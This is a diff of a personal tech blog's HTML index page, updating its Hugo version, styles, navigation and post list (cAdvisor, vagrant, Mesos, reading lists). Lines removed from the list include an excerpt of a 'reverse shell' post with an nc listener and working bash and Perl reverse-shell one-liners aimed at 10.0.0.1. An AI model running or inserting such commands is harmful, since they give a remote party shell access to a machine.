@@ -8,7 +8,7 @@
 <meta http-equiv="Cache-Control" content="public" />
 <!-- Enable responsiveness on mobile devices -->
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
-<meta name="generator" content="Hugo 0.49.2" />
+<meta name="generator" content="Hugo 0.62.2" />
 
     
 
@@ -23,12 +23,13 @@
 <meta property="og:description" content="Notes about anything" />
 <meta property="og:type" content="website" />
 <meta property="og:url" content="https://feisky.xyz/" />
+<meta property="og:updated_time" content="2018-10-14T22:08:45+08:00" />
 
 
     
 
 
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/default.min.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/github.min.css">
 
 
 
@@ -37,15 +38,15 @@
 
 
 
-<link rel="stylesheet" href="https://feisky.xyz/scss/hyde-hyde.6f40d28e777b288cb757a1db116a257b6f8dffc63a05e8473d12dc09a52d8d79.css" integrity="sha256-b0DSjnd7KIy3V6HbEWole2&#43;N/8Y6BehHPRLcCaUtjXk=">
+<link rel="stylesheet" href="/scss/hyde-hyde.92c66d107d7b219f0792cfd67223179af884b03f386ac46894f9f735932bbca3.css" integrity="sha256-ksZtEH17IZ8Hks/WciMXmviEsD84asRolPn3NZMrvKM=">
 
 
-<link rel="stylesheet" href="https://feisky.xyz/scss/print.2744dcbf8a0b2e74f8a50e4b34e5f441be7cf93cc7de27029121c6a09f9e77bc.css" integrity="sha256-J0Tcv4oLLnT4pQ5LNOX0Qb58&#43;TzH3icCkSHGoJ&#43;ed7w=" media="print">
+<link rel="stylesheet" href="/scss/print.2744dcbf8a0b2e74f8a50e4b34e5f441be7cf93cc7de27029121c6a09f9e77bc.css" integrity="sha256-J0Tcv4oLLnT4pQ5LNOX0Qb58&#43;TzH3icCkSHGoJ&#43;ed7w=" media="print">
 
 
 
 
-<link rel="stylesheet" href="https://feisky.xyz/scss/hugo-toc.8549a64d301421b4256ea9a0d5ca8b99178799f569d5d2daeb95f24cef3ce6b7.css" integrity="sha256-hUmmTTAUIbQlbqmg1cqLmReHmfVp1dLa65XyTO885rc=">
+<link rel="stylesheet" href="/scss/tocbot.126e7d75240acc946d34d6ccb2982ed4c394a5fe34e73e1a2119ca951bcf119d.css" integrity="sha256-Em59dSQKzJRtNNbMspgu1MOUpf405z4aIRnKlRvPEZ0=">
 
 
 
@@ -57,11 +58,9 @@
     <!-- Icons -->
     <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/apple-touch-icon-144-precomposed.png">
     <link rel="shortcut icon" href="/favicon.png">
+    <link rel="alternate" type="application/rss+xml" href="https://feisky.xyz/index.xml" title="Feisky" />
+
     
-
-<link href="https://feisky.xyz/index.xml" rel="alternate" type="application/rss+xml" title="Feisky" />
-<link href="https://feisky.xyz/index.xml" rel="feed" type="application/rss+xml" title="Feisky" />
-
 
 </head>
 
@@ -74,6 +73,7 @@
       <span class="site__title">
         <a href="https://feisky.xyz/">Feisky</a>
       </span>
+      
       
       <p class="site__description">
          Notes about anything 
@@ -90,7 +90,23 @@
 			 
 				<li>
 					<a href="https://kubernetes.feisky.xyz">
-						<span>Kubernetes</span>
+						<span>Kubernetes指南</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="https://time.geekbang.org/column/intro/100020901">
+						<span>Linux性能优化实战</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="https://sdn.feisky.xyz">
+						<span>SDN网络</span>
 					</a>
 				</li>
 			 
@@ -105,21 +121,12 @@
 		 
 			 
 				<li>
-					<a href="https://sdn.feisky.xyz">
-						<span>SDN</span>
-					</a>
-				</li>
-			 
-		 
-			 
-				<li>
 					<a href="/about/">
-						<span>About</span>
+						<span>关于我</span>
 					</a>
 				</li>
 			 
 		
-		</li>
 	</ul>
 </div>
 
@@ -142,16 +149,25 @@
 	
 	
 	
+	
+	
 </section>
 
       </div>
     </div>
-    <div class="copyright">
-  &copy; 2019 .
-  <a href="https://creativecommons.org/licenses/by-sa/4.0">Some Rights Reserved</a>.
-  Built with <a href="https://gohugo.io">Hugo</a> ❤️ <a href="https://github.com/htr3n/hyde-hyde">hyde-hyde</a>.
+    
+<div class="copyright">
+  &copy; 2020 feiskyer
+  
+    <a href="https://creativecommons.org/licenses/by-sa/4.0">CC BY-SA 4.0</a>
   
 </div>
+
+
+<div class="builtwith">
+Built with <a href="https://gohugo.io">Hugo</a> ❤️ <a href="https://github.com/htr3n/hyde-hyde">hyde-hyde</a>.
+</div>
+
 
   </div>
 </div>
@@ -161,91 +177,111 @@
   <div class="post-list">
     
     
+      
+        
+      
       <div class="post-list__item">
         <span class="item__title--big">
-          <a href="/posts/2015-06-05-git-commit/">git commit修改前一次提交的方法</a>
-          
+          <a href="/posts/2015-03-13-usging-cadvisor-to-monitor-docker/" >Using cAdvisor to monitor docker</a>
         </span>
         <span class="item__date">
           Jan 01, 0001
         </span>
+        <span >
         
-        方法一：用–amend选项 #修改需要修改的地方。 git add . git commit –amend 注：这种方式可以比较方便的保持原有的Change-Id，推荐使用。 方法
+        cAdvisor (Container Advisor) provides container users an understanding of the resource usage and performance characteristics of their running containers. It is a running daemon that collects, aggregates, processes, and exports information about running containers. Specifically, for each container it keeps resource isolation parameters, historical resource usage, histograms of complete historical resource usage and network statistics. This data is exported by container and machine-wide.
+cAdvisor has native support for Docker containers and should support just about any other container type out of the box.
         
+        </span>
         
-          ... <a class="read-more-symbol" href="/posts/2015-06-05-git-commit/">➦</a>
+          ... <a class="read-more-symbol" href="/posts/2015-03-13-usging-cadvisor-to-monitor-docker/">➦</a>
         
         </div>
+        
      
+      
+        
+      
       <div class="post-list__item">
         <span class="item__title--big">
-          <a href="/posts/2015-01-28-reverse-shell/">reverse shell</a>
-          
+          <a href="/posts/2015-01-27-vagrant/" >vagrant</a>
         </span>
         <span class="item__date">
           Jan 01, 0001
         </span>
-        
-        Listen for 8080 first  nc -l -p 8080 -vvv  Bash Some versions of bash can send you a reverse shell (this was tested on Ubuntu 10.10):
- bash -i & /dev/tcp/10.0.0.1/8080 0&1  PERL Here’s a shorter, feature-free version of the perl-reverse-shell:
- perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&S");open(STDOUT,"&S");open(STDERR,"&S");exec("/bin/sh -i");};'  There’s also an&nbsp;alternative PERL revere shell here.
-Python This was tested under Linux / Python 2.7:
- python -c 'import socket,subprocess,os;s=socket.
-        
-        
-          ... <a class="read-more-symbol" href="/posts/2015-01-28-reverse-shell/">➦</a>
-        
-        </div>
-     
-      <div class="post-list__item">
-        <span class="item__title--big">
-          <a href="/posts/2015-06-24-sysdig/">sysdig</a>
-          
-        </span>
-        <span class="item__date">
-          Jan 01, 0001
-        </span>
-        
-        Sysdig captures system calls and other system level events using a linux kernel facility called tracepoints, providing a rich set of real-time, system-level information.
-Sysdig &ldquo;packetizes&rdquo; this information, so that you can do things like save it into trace files and easily filter it, a bit like you would do with tcpdump. This makes it very flexible to explore what processes are doing.
-Sysdig instruments your physical and virtual machines at the OS level by installing into the Linux kernel and capturing system calls and other OS events.
-        
-        
-          ... <a class="read-more-symbol" href="/posts/2015-06-24-sysdig/">➦</a>
-        
-        </div>
-     
-      <div class="post-list__item">
-        <span class="item__title--big">
-          <a href="/posts/2015-01-27-vagrant/">vagrant</a>
-          
-        </span>
-        <span class="item__date">
-          Jan 01, 0001
-        </span>
+        <span >
         
         简易虚拟机管理工具vagrant Vagrant简介 Vagrant是一款跨平台的虚拟机管理工具，可以用来封装跨平台的开发环境，分发给团队成员共
         
+        </span>
         
           ... <a class="read-more-symbol" href="/posts/2015-01-27-vagrant/">➦</a>
         
         </div>
+        
      
+      
+        
+      
       <div class="post-list__item">
         <span class="item__title--big">
-          <a href="/posts/2015-02-06-mesosdocker/">使用Mesos来管理Docker集群</a>
-          
+          <a href="/posts/2015-06-10-weekly-reading-list-20150607/" >Weekly reading list (20150607)</a>
         </span>
         <span class="item__date">
           Jan 01, 0001
         </span>
+        <span >
+        
+        OpenStack Magnum http://www.csdn.net/article/2015-06-02/2824827 Magnum是去年巴黎峰会后开始的一个新项目，专门用来向用户提供容器服务，其最新的架构如图2所示。从去年11月份开始在StackFor
+        
+        </span>
+        
+          ... <a class="read-more-symbol" href="/posts/2015-06-10-weekly-reading-list-20150607/">➦</a>
+        
+        </div>
+        
+     
+      
+        
+      
+      <div class="post-list__item">
+        <span class="item__title--big">
+          <a href="/posts/2015-06-24-weekly-reading-list-20150626/" >Weekly reading list (20150626)</a>
+        </span>
+        <span class="item__date">
+          Jan 01, 0001
+        </span>
+        <span >
+        
+        这周最热的就是Dockercon了，列表里面很多都是docker相关的。 Open Container Project (OCP) Today we’re pleased to announce that CoreOS, Docker, and a large group of industry leaders are working together on a standard container format through the formation
+        
+        </span>
+        
+          ... <a class="read-more-symbol" href="/posts/2015-06-24-weekly-reading-list-20150626/">➦</a>
+        
+        </div>
+        
+     
+      
+        
+      
+      <div class="post-list__item">
+        <span class="item__title--big">
+          <a href="/posts/2015-02-06-mesosdocker/" >使用Mesos来管理Docker集群</a>
+        </span>
+        <span class="item__date">
+          Jan 01, 0001
+        </span>
+        <span >
         
         Introduction Apache Mesos能够在同样的集群机器上运行多种分布式系统类型，更加动态有效率低共享资源。提供失败侦测，任务发布，任务跟踪，任务监控，低层次资源
         
+        </span>
         
           ... <a class="read-more-symbol" href="/posts/2015-02-06-mesosdocker/">➦</a>
         
         </div>
+        
      
   </div>
   
@@ -400,10 +436,7 @@ if (!doNotTrack) {
 <script async src='https://www.google-analytics.com/analytics.js'></script>
 
   
-  <script defer src="https://use.fontawesome.com/releases/v5.2.0/js/all.js"
-  integrity="sha384-4oV5EgaV02iISL2ban6c/RmotsABqE4yZxZLcYMAdG7FAPsyHYAPpywE9PJo+Khy"
-  crossorigin="anonymous">
-</script>
+  <script defer src="https://use.fontawesome.com/releases/v5.5.0/js/all.js" integrity="sha384-GqVMZRt5Gn7tB9D9q7ONtcp4gtHIUEW/yG7h98J7IpE3kpi+srfFyyB/04OV6pG0" crossorigin="anonymous"></script>
 
 
     </body>
